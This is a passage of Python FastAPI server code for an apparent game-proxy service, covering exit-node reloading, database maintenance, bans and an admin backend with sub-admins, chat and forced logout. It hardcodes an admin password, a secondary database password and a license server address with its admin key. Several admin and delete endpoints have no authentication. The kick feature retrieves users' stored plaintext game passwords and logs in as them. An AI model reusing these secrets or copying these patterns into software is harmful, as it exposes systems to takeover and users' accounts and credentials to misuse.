        return {"success": False, "message": parsed["error"]}



    if not parsed.get("nodes"):

        return {"success": False, "message": "未解析到任何节点"}



    # 2) 筛选节点：每个节点作为独立出口（同一服务器域名下的多端口节点各自占一个 SOCKS5 端口）

    all_nodes = parsed["nodes"]

    servers_map = parsed.get("servers", {})



    if selected_node_indices is not None:

        # 新格式：前端按节点索引选择

        nodes_to_add = []

        for idx in selected_node_indices:

            if 0 <= idx < len(all_nodes):

                node = dict(all_nodes[idx])

                node["display_name"] = node.get("name") or f"{node.get('region_label', '')}节点{len(nodes_to_add)+1}"

                nodes_to_add.append(node)

    elif selected_servers:

        # 旧格式兑容：前端指定了服务器列表，每个服务器取其下所有节点

        selected_set = {s["server"] for s in selected_servers}

        nodes_to_add = []

        names_map = {s["server"]: s["name"] for s in selected_servers}

        for srv in selected_set:

            indices = servers_map.get(srv, [])

            for j, idx in enumerate(indices):

                node = dict(all_nodes[idx])

                base_name = names_map.get(srv, node.get("name", srv))

                node["display_name"] = base_name if len(indices) == 1 else f"{base_name}_{j+1:02d}"

                nodes_to_add.append(node)

    else:

        # 没指定就全部添加，每个节点作为独立出口

        nodes_to_add = []

        for i, node in enumerate(all_nodes):

            node_copy = dict(node)

            node_copy["display_name"] = node.get("name") or f"{node.get('region_label', '')}节点{i+1}"

            nodes_to_add.append(node_copy)



    if not nodes_to_add:

        return {"success": False, "message": "筛选后无有效节点"}



    # 3) 生成 sing-box 配置 + 写盘 + 重载

    apply_result = sbm.apply_nodes(nodes_to_add, base_port)



    # 4) 清除旧的隧道出口 (保留#0直连)，注册新出口到 dispatcher

    while len(dispatcher.exits) > 1:

        dispatcher.exits.pop()



    added_exits = []

    for i, node in enumerate(nodes_to_add):

        port = base_port + i

        name = node.get("display_name", node.get("name", f"node_{i}"))

        idx = dispatcher.add_socks5(name, port)

        added_exits.append({"index": idx, "name": name, "port": port})



    logger.info(f"[Dispatcher] 订阅热重载完成: {len(added_exits)} 个出口已注册")

    
    # 持久化节点配置，重启自动恢复
    try:
        exits_config = {
            "nodes": nodes_to_add,
            "base_port": base_port,
            "timestamp": time.time()
        }
        config_file = os.path.join(os.path.dirname(__file__), "dispatcher_exits.json")
        with open(config_file, "w", encoding="utf-8") as f:
            json.dump(exits_config, f, ensure_ascii=False, indent=2)
        logger.info(f"[Dispatcher] 节点配置已保存: {config_file}")
    except Exception as e:
        logger.warning(f"[Dispatcher] 保存节点配置失败: {e}")

    # 更新数据库中的订阅组记录
    if apply_result["success"]:
        try:
            import uuid
            from datetime import datetime as _dt
            await db.clear_all_subscription_groups()
            group_id = str(uuid.uuid4())
            source_type = "url" if url else ("text" if text else "json")
            source_url = url or ""
            group_name = f"订阅导入 {_dt.now().strftime('%m-%d %H:%M')}"
            await db.create_subscription_group(
                group_id=group_id,
                name=group_name,
                source_type=source_type,
                source_url=source_url,
                total_servers=len(nodes_to_add),
                created_by='admin',
                notes=''
            )
            logger.info(f"[SubGroup] 订阅组记录已更新: {len(nodes_to_add)} 台服务器")
        except Exception as e:
            logger.warning(f"[SubGroup] 更新订阅组记录失败: {e}")

    return {

        "success": apply_result["success"],

        "message": apply_result["message"],

        "singbox_reload": apply_result["success"],

        "nodes_count": len(nodes_to_add),

        "exits_added": added_exits,

        "config_path": apply_result.get("config_path", ""),

    }





@app.post("/api/dispatcher/reload_singbox")

async def api_dispatcher_reload_singbox():

    """手动热重载 sing-box 服务"""

    import singbox_manager as sbm

    return sbm.reload_service()





@app.get("/api/dispatcher/singbox_status")

async def api_dispatcher_singbox_status():

    """获取 sing-box 服务状态"""

    import singbox_manager as sbm

    return sbm.get_service_status()


@app.get("/api/dispatcher/full")
async def api_dispatcher_full():
    """合并 dispatcher 状态 + singbox 状态，减少前端轮询请求数"""
    import singbox_manager as sbm
    return {**dispatcher.get_status(), "singbox": sbm.get_service_status()}





@app.get("/api/db/size")

async def api_db_size():

    """查看数据库各表存储占用"""

    try:

        size_info = await db.get_db_size()

        row_counts = await db.get_table_row_counts()

        for t in size_info.get('tables', []):

            t['row_count_exact'] = row_counts.get(t['table_name'], 0)

        return {"success": True, "data": size_info}

    except Exception as e:

        return {"success": False, "message": f"查询失败: {e}"}





@app.post("/api/db/delete")

async def api_db_delete(request: Request):

    """按日期删除指定表数据

    参数: table, before_date, after_date, exact_date (YYYY-MM-DD)

    """

    try:

        data = await request.json()

        table = data.get("table", "")

        before_date = data.get("before_date")

        after_date = data.get("after_date")

        exact_date = data.get("exact_date")

        deleted = await db.delete_by_date(table, before_date, after_date, exact_date)

        return {"success": True, "deleted": deleted, "table": table}

    except ValueError as e:

        return {"success": False, "message": str(e)}

    except Exception as e:

        return {"success": False, "message": f"删除失败: {e}"}





@app.get("/api/db/stats")

async def api_db_stats():

    """获取数据库统计摘要 + 连接池状态"""

    try:

        summary = await db.get_stats_summary()

        row_counts = await db.get_table_row_counts()

        pool_info = db.get_pool_info()

        return {"success": True, "summary": summary, "row_counts": row_counts, "pool": pool_info}

    except Exception as e:

        return {"success": False, "message": f"查询失败: {e}"}





@app.post("/api/ban")

async def api_ban(request: Request):

    """封禁账号或IP（持久化到PostgreSQL）"""

    data = await request.json()

    ban_type = data.get("type", "")

    value = data.get("value", "")

    reason = data.get("reason", "")

    

    if ban_type == "account" and value:

        stats.banned_accounts.add(value.lower())

        try:

            await db.ban_user(value, reason)

        except Exception as e:

            logger.warning(f"[Ban] 数据库封禁失败: {e}")

        logger.info(f"[Ban] 封禁账号: {value}")

        return {"success": True, "message": f"已封禁账号: {value}"}

    elif ban_type == "ip" and value:

        stats.banned_ips.add(value)

        try:

            await db.ban_ip(value, reason)

        except Exception as e:

            logger.warning(f"[Ban] 数据库封禁失败: {e}")

        logger.info(f"[Ban] 封禁IP: {value}")

        return {"success": True, "message": f"已封禁IP: {value}"}

    

    return {"success": False, "message": "参数无效，需要 type(account/ip) 和 value"}





@app.post("/api/unban")

async def api_unban(request: Request):

    """解除封禁（持久化到PostgreSQL）"""

    data = await request.json()

    ban_type = data.get("type", "")

    value = data.get("value", "")

    

    if ban_type == "account" and value:

        stats.banned_accounts.discard(value.lower())

        try:

            await db.unban_user(value)

        except Exception as e:

            logger.warning(f"[Unban] 数据库解封失败: {e}")

        logger.info(f"[Unban] 解封账号: {value}")

        return {"success": True, "message": f"已解封账号: {value}"}

    elif ban_type == "ip" and value:

        stats.banned_ips.discard(value)

        try:

            await db.unban_ip(value)

        except Exception as e:

            logger.warning(f"[Unban] 数据库解封失败: {e}")

        logger.info(f"[Unban] 解封IP: {value}")

        return {"success": True, "message": f"已解封IP: {value}"}

    

    return {"success": False, "message": "参数无效"}





# ===== 管理后台系统 =====



ADMIN_PASSWORD = "ak-lovejjy1314"

DB_SECONDARY_PASSWORD = "aa292180"

ROLE_SUPER_ADMIN = "super_admin"

ROLE_SUB_ADMIN = "sub_admin"

SUB_ADMINS = {}

admin_tokens = {}

LOGIN_MAX_FAILS = 5

LOGIN_LOCKOUT_TIME = 300

login_fail_records = {}

db_auth_tokens = {}



LICENSE_SERVER_URL = os.environ.get('LICENSE_SERVER_URL', 'http://121.4.46.66:8080')

LICENSE_ADMIN_KEY = os.environ.get('LICENSE_ADMIN_KEY', 'ak-lovejjy1314')





# --- 登录防暴力 ---

def check_login_lockout(ip: str):

    record = login_fail_records.get(ip, [0, 0])

    if record[0] >= LOGIN_MAX_FAILS:

        elapsed = time.time() - record[1]

        if elapsed < LOGIN_LOCKOUT_TIME:

            return True, int(LOGIN_LOCKOUT_TIME - elapsed)

        login_fail_records.pop(ip, None)

    return False, 0



def record_login_fail(ip: str):

    record = login_fail_records.get(ip, [0, 0])

    record[0] += 1

    record[1] = time.time()

    login_fail_records[ip] = record



def clear_login_fail(ip: str):

    login_fail_records.pop(ip, None)





# --- 密码验证 ---

def verify_admin_password(password: str):

    if not password or not isinstance(password, str):

        return False, None, None

    if secrets.compare_digest(password, ADMIN_PASSWORD):

        return True, ROLE_SUPER_ADMIN, None

    for sub_name, sub_data in SUB_ADMINS.items():

        sub_pwd = sub_data.get('password', '') if isinstance(sub_data, dict) else sub_data

        if sub_pwd and secrets.compare_digest(password, sub_pwd):

            return True, ROLE_SUB_ADMIN, sub_name

    return False, None, None



def get_sub_admin_permissions(sub_name: str) -> dict:

    sub_data = SUB_ADMINS.get(sub_name, {})

    return sub_data.get('permissions', {}) if isinstance(sub_data, dict) else {}



def check_token_permission(token: str, perm_key: str) -> bool:

    role = get_token_role(token)

    if role == ROLE_SUPER_ADMIN:

        return True

    if role == ROLE_SUB_ADMIN:

        sub_name = get_token_sub_name(token)

        if sub_name:

            return get_sub_admin_permissions(sub_name).get(perm_key, False)

    return False





# --- Token管理 ---

async def _load_tokens_from_db():

    global admin_tokens

    try:

        admin_tokens = await db.load_all_admin_tokens()

        logger.info(f"[Token] 从数据库恢复了 {len(admin_tokens)} 个有效Token")

    except Exception as e:

        logger.warning(f"[Token] 加载Token失败: {e}")

        admin_tokens = {}



async def generate_admin_token(role: str, sub_name: str = '') -> str:

    if role == ROLE_SUB_ADMIN and sub_name:

        tokens_to_remove = [t for t, d in admin_tokens.items()

                            if d.get('role') == ROLE_SUB_ADMIN and d.get('sub_name') == sub_name]

        for t in tokens_to_remove:

            admin_tokens.pop(t, None)

        await db.delete_admin_tokens_by_sub_name(sub_name)

    else:

        tokens_to_remove = [t for t, d in admin_tokens.items() if d.get('role') == role]

        for t in tokens_to_remove:

            admin_tokens.pop(t, None)

        await db.delete_admin_tokens_by_role(role)



    token = secrets.token_urlsafe(32)

    expire = time.time() + 86400

    admin_tokens[token] = {'expire': expire, 'role': role, 'sub_name': sub_name}

    await db.save_admin_token(token, role, expire, sub_name)

    return token



async def verify_admin_token(token: str) -> bool:

    if not token:

        return False

    token_data = admin_tokens.get(token)

    if not token_data:

        token_data = await db.get_admin_token(token)

        if token_data:

            admin_tokens[token] = token_data

    if not token_data:

        return False

    if time.time() > token_data.get('expire', 0):

        admin_tokens.pop(token, None)

        await db.delete_admin_token(token)

        return False

    return True



def get_token_role(token: str):

    if not token:

        return None

    td = admin_tokens.get(token)

    if td and time.time() <= td.get('expire', 0):

        return td.get('role')

    return None



def get_token_sub_name(token: str) -> str:

    if not token:

        return ''

    td = admin_tokens.get(token)

    if td and time.time() <= td.get('expire', 0):

        return td.get('sub_name', '')

    return ''



async def kick_sub_admins(target_name: str = None) -> int:

    if target_name:

        tokens_to_remove = [t for t, d in admin_tokens.items()

                            if d.get('role') == ROLE_SUB_ADMIN and d.get('sub_name') == target_name]

        for t in tokens_to_remove:

            admin_tokens.pop(t, None)

        count = await db.delete_admin_tokens_by_sub_name(target_name)

        return max(len(tokens_to_remove), count)

    else:

        tokens_to_remove = [t for t, d in admin_tokens.items() if d.get('role') == ROLE_SUB_ADMIN]

        for t in tokens_to_remove:

            admin_tokens.pop(t, None)

        count = await db.delete_admin_tokens_by_role(ROLE_SUB_ADMIN)

        return max(len(tokens_to_remove), count)





# --- 二级密码 ---

def generate_db_token():

    token = secrets.token_urlsafe(32)

    db_auth_tokens[token] = time.time() + 1800

    expired = [k for k, v in db_auth_tokens.items() if v < time.time()]

    for k in expired:

        del db_auth_tokens[k]

    return token



def verify_db_token(token: str) -> bool:

    if not token:

        return False

    expire_time = db_auth_tokens.get(token)

    if not expire_time or time.time() > expire_time:

        db_auth_tokens.pop(token, None)

        return False

    return True



def verify_db_password(password: str) -> bool:

    if not password or not isinstance(password, str):

        return False

    return secrets.compare_digest(password, DB_SECONDARY_PASSWORD)



def check_db_auth(request: Request):

    token = request.headers.get("X-DB-Token")

    if not verify_db_token(token):

        raise HTTPException(status_code=403, detail="数据库操作需要二级密码验证")





# --- WebSocket管理器 ---

class ConnectionManager:

    def __init__(self):

        self.active_connections = set()

        self.sub_admin_sessions = {}



    async def connect(self, websocket: WebSocket):

        await websocket.accept()

        self.active_connections.add(websocket)



    def disconnect(self, websocket: WebSocket):

        self.active_connections.discard(websocket)

        to_remove = [n for n, s in self.sub_admin_sessions.items() if s.get('websocket') is websocket]

        for n in to_remove:

            del self.sub_admin_sessions[n]



    def register_sub_admin(self, sub_name: str, websocket: WebSocket):

        self.sub_admin_sessions[sub_name] = {

            'websocket': websocket, 'last_heartbeat': datetime.now(),

            'login_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        }



    def heartbeat_sub_admin(self, sub_name: str):

        if sub_name in self.sub_admin_sessions:

            self.sub_admin_sessions[sub_name]['last_heartbeat'] = datetime.now()



    def get_online_sub_admins(self) -> dict:

        now = datetime.now()

        online, offline = {}, []

        for name, sess in self.sub_admin_sessions.items():

            if (now - sess['last_heartbeat']).total_seconds() > 15:

                offline.append(name)

            else:

                online[name] = sess['login_time']

        for n in offline:

            del self.sub_admin_sessions[n]

        return online



    async def broadcast(self, message: dict):

        dead = set()

        for conn in self.active_connections:

            try:

                await conn.send_json(message)

            except Exception:

                dead.add(conn)

        self.active_connections -= dead



ws_manager = ConnectionManager()





class OnlineUserManager:

    def __init__(self):

        self.users = {}

        self.messages = {}



    async def user_online(self, username, websocket, page, user_agent):

        existing = self.users.get(username, {})

        self.users[username] = {

            'websocket': websocket, 'ws_id': id(websocket), 'page': page, 'user_agent': user_agent,

            'online_time': existing.get('online_time', datetime.now().strftime('%Y-%m-%d %H:%M:%S')),

            'last_heartbeat': datetime.now()

        }



    def user_offline(self, username, websocket=None):

        if username not in self.users:

            return

        if websocket is None or self.users[username].get('websocket') is websocket:

            del self.users[username]



    def update_heartbeat(self, username):

        if username in self.users:

            self.users[username]['last_heartbeat'] = datetime.now()



    def get_online_users(self):

        now = datetime.now()

        online, offline = [], []

        for u, d in self.users.items():

            if (now - d['last_heartbeat']).total_seconds() > 15:

                offline.append(u)

            else:

                online.append({'username': u, 'page': d['page'],

                               'user_agent': (d['user_agent'] or '')[:50],

                               'online_time': d['online_time']})

        for u in offline:

            del self.users[u]

        return online



    async def send_to_user(self, username, content, save_history=True):

        if username in self.users:

            try:

                await self.users[username]['websocket'].send_json({

                    'type': 'admin_message', 'content': content,

                    'time': datetime.now().strftime('%H:%M:%S')

                })

                if save_history:

                    self.messages.setdefault(username, []).append(

                        {'content': content, 'is_admin': True, 'time': datetime.now().strftime('%H:%M:%S')})

                return True

            except Exception:

                return False

        return False



    def save_user_message(self, username, content):

        self.messages.setdefault(username, []).append(

            {'content': content, 'is_admin': False, 'time': datetime.now().strftime('%H:%M:%S')})



    def get_messages(self, username):

        return self.messages.get(username, [])[-50:]



online_manager = OnlineUserManager()





# --- 启动任务 ---

@app.on_event("startup")

async def admin_startup():

    await _load_tokens_from_db()

    try:

        global SUB_ADMINS

        SUB_ADMINS = await db.db_get_all_sub_admins()

        logger.info(f"[SubAdmin] 加载了 {len(SUB_ADMINS)} 个子管理员")

    except Exception as e:

        logger.warning(f"[SubAdmin] 加载失败: {e}")



    async def _token_cleanup():

        while True:

            await asyncio.sleep(3600)

            try:

                expired = [k for k, v in admin_tokens.items() if v.get('expire', 0) < time.time()]

                for k in expired:

                    admin_tokens.pop(k, None)

                await db.cleanup_expired_tokens()

            except Exception:

                pass

    asyncio.create_task(_token_cleanup())



    async def _expire_accounts():

        while True:

            await asyncio.sleep(300)

            try:

                count = await db.expire_overdue_accounts()

                if count > 0:

                    logger.info(f"[Auth] 自动过期了 {count} 个账号")

            except Exception:

                pass

    asyncio.create_task(_expire_accounts())





# ===== 管理后台 API =====



@app.post("/admin/api/login")

async def admin_login(request: Request):

    client_ip = request.client.host if request.client else "unknown"

    is_locked, remaining = check_login_lockout(client_ip)

    if is_locked:

        return {"success": False, "message": f"登录尝试过多，请{remaining}秒后重试"}

    try:

        data = await request.json()

        password = data.get('password', '')

    except Exception:

        return {"success": False, "message": "请求无效"}

    await asyncio.sleep(0.3)

    is_valid, role, sub_name = verify_admin_password(password)

    if is_valid:

        clear_login_fail(client_ip)

        token = await generate_admin_token(role, sub_name=sub_name or '')

        if role == ROLE_SUPER_ADMIN:

            role_name = "系统总管理"

            permissions = {}

        else:

            role_name = f"子管理员({sub_name})" if sub_name else "子管理员"

            permissions = get_sub_admin_permissions(sub_name) if sub_name else {}

        return {"success": True, "token": token, "role": role, "role_name": role_name,

                "sub_name": sub_name or "", "permissions": permissions}

    else:

        record_login_fail(client_ip)

        await asyncio.sleep(0.7)

        record = login_fail_records.get(client_ip, [0, 0])

        if record[0] >= LOGIN_MAX_FAILS:

            return {"success": False, "message": f"密码错误次数过多，账号已锁定{LOGIN_LOCKOUT_TIME}秒"}

        return {"success": False, "message": f"密码错误，剩余{LOGIN_MAX_FAILS - record[0]}次尝试机会"}



@app.get("/admin/api/verify_token")

async def verify_token_api(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not token or not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"valid": False, "message": "未登录"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    if role == ROLE_SUPER_ADMIN:

        role_name, permissions = "系统总管理", {}

    else:

        role_name = f"子管理员({sub_name})" if sub_name else "子管理员"

        permissions = get_sub_admin_permissions(sub_name) if sub_name else {}

    return {"valid": True, "role": role, "role_name": role_name, "sub_name": sub_name or "", "permissions": permissions}



@app.get("/admin/api/stats")

async def admin_stats():

    return await db.get_stats_summary()



@app.get("/admin/api/dashboard")

async def admin_dashboard():

    try:

        return await db.get_dashboard_data()

    except Exception as e:

        logger.warning(f"[Dashboard] 数据加载失败: {e}")

        return {"today_requests": 0, "success_rate": 0, "active_users": 0, "peak_rpm": 0, "hourly_data": [], "top_users": [], "top_ips": []}



@app.get("/admin/api/users")

async def admin_users(limit: int = 100, offset: int = 0):

    return await db.get_all_users_with_assets(limit, offset)



@app.get("/admin/api/ips")

async def admin_ips(limit: int = 100, offset: int = 0):

    return await db.get_all_ips(limit, offset)



@app.get("/admin/api/usage")

async def admin_usage(limit: int = 100, offset: int = 0, search: str = None):

    return await db.get_all_users(limit, offset, search)



@app.get("/admin/api/logins")

async def admin_logins(limit: int = 50):

    return await db.get_recent_logins(limit)



@app.get("/admin/api/user/{username}")

async def admin_user_detail(username: str):

    user = await db.get_user_detail(username)

    if not user:

        raise HTTPException(status_code=404, detail="用户不存在")

    return user


@app.post("/admin/api/user/real_name")

async def admin_user_real_name(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    try:

        data = await request.json()

    except Exception:

        return JSONResponse(status_code=400, content={"success": False, "message": "请求无效"})

    username = str(data.get('username', '')).strip()

    real_name = str(data.get('real_name', '')).strip()

    if not username:

        return {"success": False, "message": "账号不能为空"}

    if not real_name:

        return {"success": False, "message": "姓名不能为空"}

    ok = await db.upsert_user_real_name(username, real_name)

    if not ok:

        return {"success": False, "message": "姓名保存失败"}

    return {"success": True, "message": "姓名已保存", "data": {"username": username.lower(), "real_name": real_name}}



@app.get("/admin/api/banlist")

async def admin_banlist():

    return await db.get_ban_list()



@app.get("/admin/api/assets")

async def admin_assets(limit: int = 100, offset: int = 0, search: str = None,
                       sort_field: str = 'updated_at', sort_dir: str = 'desc'):

    return await db.get_all_user_assets(limit, offset, search, sort_field, sort_dir)



@app.get("/admin/api/assets/{username}")

async def admin_user_assets(username: str):

    assets = await db.get_user_assets(username)

    if not assets:

        raise HTTPException(status_code=404, detail="用户资产不存在")

    return assets



@app.post("/admin/api/ban/user")

async def admin_ban_user(request: Request):

    data = await request.json()

    value, reason = data.get('value', ''), data.get('reason', '')

    await db.ban_user(value, reason)

    stats.banned_accounts.add(value.lower())

    await ws_manager.broadcast({"type": "user_banned", "data": {"username": value, "reason": reason}})

    await force_logout_user(value)

    return {"success": True, "message": f"用户 {value} 已被封禁并踢出"}



@app.post("/admin/api/unban/user")

async def admin_unban_user(request: Request):

    data = await request.json()

    value = data.get('value', '')

    await db.unban_user(value)

    stats.banned_accounts.discard(value.lower())

    await ws_manager.broadcast({"type": "user_unbanned", "data": {"username": value}})

    return {"success": True, "message": f"用户 {value} 已解封"}



@app.post("/admin/api/ban/ip")

async def admin_ban_ip(request: Request):

    data = await request.json()

    value, reason = data.get('value', ''), data.get('reason', '')

    await db.ban_ip(value, reason)

    stats.banned_ips.add(value)

    await ws_manager.broadcast({"type": "ip_banned", "data": {"ip": value, "reason": reason}})

    return {"success": True, "message": f"IP {value} 已被封禁"}



@app.post("/admin/api/unban/ip")

async def admin_unban_ip(request: Request):

    data = await request.json()

    value = data.get('value', '')

    await db.unban_ip(value)

    stats.banned_ips.discard(value)

    await ws_manager.broadcast({"type": "ip_unbanned", "data": {"ip": value}})

    return {"success": True, "message": f"IP {value} 已解封"}



@app.get("/admin/api/online")

async def admin_online_users():

    return online_manager.get_online_users()



async def force_logout_user(username: str) -> str:

    """顶号：用数据库存储的密码重新登录游戏服务器，使旧session失效，然后从在线列表移除。
    返回执行结果描述。"""

    password = await db.get_user_password(username)

    if password:

        try:

            resp = await forward_request(

                "POST", "Login",

                "application/x-www-form-urlencoded",

                {"account": username, "password": password,

                 "client": "WEB", "key": "123",

                 "UserID": "123", "v": "2125", "lang": "cn"},

                b"", {}, is_login=True

            )

            logger.info(f"[Kick] 顶号 {username} 登录结果: {resp.status_code}")

        except Exception as e:

            logger.warning(f"[Kick] 顶号 {username} 请求失败: {e}")

    online_manager.user_offline(username)

    await ws_manager.broadcast({"type": "user_offline", "data": {"username": username}})

    result = f"已踢出 {username}" + ("(顶号成功)" if password else "(无密码记录，仅移除在线状态)")

    return result



@app.post("/admin/api/kick")

async def admin_kick_user(request: Request):

    data = await request.json()

    username = data.get("username", "").strip()

    if not username:

        raise HTTPException(status_code=400, detail="缺少username")

    msg = await force_logout_user(username)

    return {"success": True, "message": msg}



@app.post("/admin/api/chat/send")

async def admin_chat_send(request: Request):

    data = await request.json()

    username, content = data.get('username'), data.get('content')

    if not username or not content:

        raise HTTPException(status_code=400, detail="缺少参数")

    success = await online_manager.send_to_user(username, content)

    if success:

        await ws_manager.broadcast({"type": "chat_message", "data": {

            "username": username, "content": content,

            "time": datetime.now().strftime('%H:%M:%S'), "is_admin": True}})

        return {"success": True}

    raise HTTPException(status_code=404, detail="用户不在线")



@app.get("/admin/api/chat/history/{username}")

async def admin_chat_history(username: str):

    return online_manager.get_messages(username)



@app.post("/admin/api/chat/broadcast")

async def admin_chat_broadcast(request: Request):

    data = await request.json()

    content = data.get('content')

    if not content:

        raise HTTPException(status_code=400, detail="缺少消息内容")

    online_users = online_manager.get_online_users()

    sent_count = 0

    for user in online_users:

        if await online_manager.send_to_user(user.get('username'), content, save_history=False):

            sent_count += 1

    await ws_manager.broadcast({"type": "broadcast_message", "data": {

        "content": content, "time": datetime.now().strftime('%H:%M:%S'), "sent_count": sent_count}})

    return {"success": True, "sent_count": sent_count}





# --- 子管理员管理 ---

@app.get("/admin/api/sub_admin")

async def admin_sub_admin_list(request: Request):

    online_subs = ws_manager.get_online_sub_admins()

    login_times = {}

    for token, data in admin_tokens.items():

        if data.get('role') == ROLE_SUB_ADMIN and data.get('expire', 0) > time.time():

            sname = data.get('sub_name', '')

            if sname and sname not in login_times:

                login_times[sname] = datetime.fromtimestamp(data.get('expire', 0) - 86400).strftime('%Y-%m-%d %H:%M:%S')

    sub_admin_list = []

    for name, sub_data in SUB_ADMINS.items():

        pwd = sub_data.get('password', '') if isinstance(sub_data, dict) else sub_data

        perms = sub_data.get('permissions', {}) if isinstance(sub_data, dict) else {}

        sub_admin_list.append({

            "name": name, "password_hint": pwd[:2] + "***" if pwd and len(pwd) > 2 else "***",

            "is_online": name in online_subs, "login_time": login_times.get(name), "permissions": perms})

    return {"sub_admins": sub_admin_list, "total": len(SUB_ADMINS)}



@app.post("/admin/api/sub_admin/set")

async def admin_sub_admin_set(request: Request):

    await asyncio.sleep(0.3)

    try:

        data = await request.json()

    except Exception:

        return {"success": False, "message": "请求无效"}

    admin_password = data.get('admin_password', '')

    secondary_password = data.get('secondary_password', '')

    sub_name = data.get('sub_name', '').strip()

    new_sub_password = data.get('new_sub_password', '')



    is_valid, role, _ = verify_admin_password(admin_password)

    if not is_valid or role != ROLE_SUPER_ADMIN:

        await asyncio.sleep(0.7)

        return {"success": False, "message": "系统总管理员密码错误"}

    if not verify_db_password(secondary_password):

        await asyncio.sleep(0.7)

        return {"success": False, "message": "二级密码错误"}

    if not sub_name or len(sub_name) > 20:

        return {"success": False, "message": "子管理员名称无效"}

    if not new_sub_password or len(new_sub_password) < 6:

        return {"success": False, "message": "子管理员密码至少6位"}

    if secrets.compare_digest(new_sub_password, ADMIN_PASSWORD):

        return {"success": False, "message": "不能与总管理员密码相同"}



    permissions = data.get('permissions', {})

    is_update = sub_name in SUB_ADMINS

    try:

        await db.db_set_sub_admin(sub_name, new_sub_password, permissions)

        SUB_ADMINS[sub_name] = {'password': new_sub_password, 'permissions': permissions}

        return {"success": True, "message": f"子管理员 [{sub_name}] {'更新' if is_update else '添加'}成功"}

    except Exception as e:

        return {"success": False, "message": f"保存失败: {e}"}



@app.post("/admin/api/sub_admin/update_permissions")

async def admin_sub_admin_update_perms(request: Request):

    await asyncio.sleep(0.3)

    try:

        data = await request.json()

    except Exception:

        return {"success": False, "message": "请求无效"}

    is_valid, role, _ = verify_admin_password(data.get('admin_password', ''))

    if not is_valid or role != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "需要系统总管理员密码"}

    sub_name = data.get('sub_name', '').strip()

    if not sub_name or sub_name not in SUB_ADMINS:

        return {"success": False, "message": f"子管理员 [{sub_name}] 不存在"}

    permissions = data.get('permissions', {})

    try:

        await db.db_update_sub_admin_permissions(sub_name, permissions)

        if isinstance(SUB_ADMINS.get(sub_name), dict):

            SUB_ADMINS[sub_name]['permissions'] = permissions

        kicked = await kick_sub_admins(target_name=sub_name)

        msg = f"子管理员 [{sub_name}] 权限已更新"

        if kicked > 0:

            msg += f"，已踢出{kicked}个会话"

        return {"success": True, "message": msg}

    except Exception as e:

        return {"success": False, "message": f"更新失败: {e}"}



@app.post("/admin/api/sub_admin/delete")

async def admin_sub_admin_delete(request: Request):

    await asyncio.sleep(0.3)

    try:

        data = await request.json()

    except Exception:

        return {"success": False, "message": "请求无效"}

    is_valid, role, _ = verify_admin_password(data.get('admin_password', ''))

    if not is_valid or role != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "系统总管理员密码错误"}

    if not verify_db_password(data.get('secondary_password', '')):

        return {"success": False, "message": "二级密码错误"}

    sub_name = data.get('sub_name', '').strip()

    if not sub_name or sub_name not in SUB_ADMINS:

        return {"success": False, "message": f"子管理员 [{sub_name}] 不存在"}

    await kick_sub_admins(target_name=sub_name)

    try:

        await db.db_delete_sub_admin(sub_name)

        SUB_ADMINS.pop(sub_name, None)

        return {"success": True, "message": f"子管理员 [{sub_name}] 已删除"}

    except Exception as e:

        return {"success": False, "message": f"删除失败: {e}"}



@app.post("/admin/api/sub_admin/kick")

async def admin_sub_admin_kick(request: Request):

    await asyncio.sleep(0.3)

    try:

        data = await request.json()

    except Exception:

        return {"success": False, "message": "请求无效"}

    is_valid, role, _ = verify_admin_password(data.get('admin_password', ''))

    if not is_valid or role != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "系统总管理员密码错误"}

    sub_name = data.get('sub_name', '').strip()

    count = await kick_sub_admins(target_name=sub_name if sub_name else None)

    target = f"子管理员 [{sub_name}]" if sub_name else "所有子管理员"

    if count > 0:

        return {"success": True, "message": f"已踢出 {target} ({count} 个会话)"}

    return {"success": True, "message": f"{target} 当前没有在线会话"}


@app.get("/admin/api/sub_admin/monitoring_status")
async def admin_sub_admin_monitoring_status(request: Request):
    """获取子管理员在线监控开关状态"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    try:
        enabled = await db.get_sub_admin_monitoring_status()
        return {
            "success": True,
            "enabled": enabled,
            "description": "子管理员在线状态监控：开启后子管理员需定期发送心跳上报在线状态"
        }
    except Exception as e:
        logger.error(f"[SubAdmin] 获取在线监控开关失败: {e}")
        return {"success": False, "message": f"获取失败: {str(e)}"}


@app.post("/admin/api/sub_admin/set_monitoring")
async def admin_sub_admin_set_monitoring(request: Request):
    """设置子管理员在线监控开关（仅系统总管理员）"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_info = await verify_admin_token(token)
    if not user_info or get_token_role(token) != ROLE_SUPER_ADMIN:
        return JSONResponse(status_code=403, content={"error": True, "message": "仅系统总管理员可操作"})
    data = await request.json()
    enabled = bool(data.get('enabled', False))
    try:
        ok = await db.set_sub_admin_monitoring_status(enabled)
        if ok:
            status_text = "开启" if enabled else "关闭"
            logger.info(f"[SubAdmin] 在线监控已{status_text}")
            return {"success": True, "enabled": enabled, "message": f"子管理员在线监控已{status_text}"}
        return {"success": False, "message": "设置失败"}
    except Exception as e:
        logger.error(f"[SubAdmin] 设置在线监控开关失败: {e}")
        return {"success": False, "message": f"设置失败: {str(e)}"}


# --- 数据库管理API ---

@app.post("/admin/api/db/auth")

async def admin_db_auth(request: Request):

    try:

        data = await request.json()

        await asyncio.sleep(0.5)

        if verify_db_password(data.get('password', '')):

            token = generate_db_token()

            return {"success": True, "token": token, "expires_in": 1800}

        await asyncio.sleep(1)

        raise HTTPException(status_code=401, detail="二级密码错误")

    except HTTPException:

        raise

    except Exception:

        raise HTTPException(status_code=400, detail="验证请求无效")



@app.api_route("/admin/api/db/verify", methods=["GET", "POST"])

async def admin_db_verify(request: Request):

    token = request.headers.get("X-DB-Token")

    return {"valid": verify_db_token(token)}



@app.get("/admin/api/db/tables")

async def admin_db_tables(request: Request):

    check_db_auth(request)

    return await db.get_all_tables()



@app.get("/admin/api/db/schema/{table_name}")

async def admin_db_schema(table_name: str, request: Request):

